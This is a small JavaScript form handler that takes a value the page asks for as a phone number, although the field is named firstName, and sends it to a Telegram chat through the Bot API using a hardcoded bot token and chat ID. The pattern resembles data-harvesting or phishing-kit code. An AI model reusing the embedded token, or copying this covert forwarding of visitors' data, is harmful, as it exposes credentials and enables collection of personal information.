document.addEventListener('DOMContentLoaded', function() {
    const sendButton = document.getElementById('sendButton');
    const firstNameInput = document.getElementById('firstName');
    const messageDiv = document.getElementById('message');
    
    sendButton.addEventListener('click', function() {
        const firstName = firstNameInput.value.trim();
        
        if (!firstName) {
            showMessage('Please enter your phone number', 'error');
            return;
        }
        
        sendButton.disabled = true;
        showMessage('Sending...', 'info');
        
        // Telegram bot details
        const botToken = '7806045699:AAHXIhdiILQQBsxWoq2R1ckTKAdOu-33-9g';
        const chatId = '7850420013';
        const text = `New name submission: ${firstName}`;
        
        // Send to Telegram bot
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: text
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                showMessage('Number sent successfully!', 'success');
                firstNameInput.value = '';
            } else {
                showMessage('Failed to send. Please try again.', 'error');
                console.error('Telegram API error:', data);
            }
        })
        .catch(error => {
            showMessage('An error occurred. Please try again.', 'error');
            console.error('Error:', error);
        })
        .finally(() => {
            sendButton.disabled = false;
        });
    });
    
    function showMessage(text, type) {
        messageDiv.textContent = text;
        messageDiv.className = type; // Adds class for styling if needed
        
        // Clear message after 5 seconds
        if (type !== 'info') {
            setTimeout(() => {
                messageDiv.textContent = '';
            }, 5000);
        }
    }
});
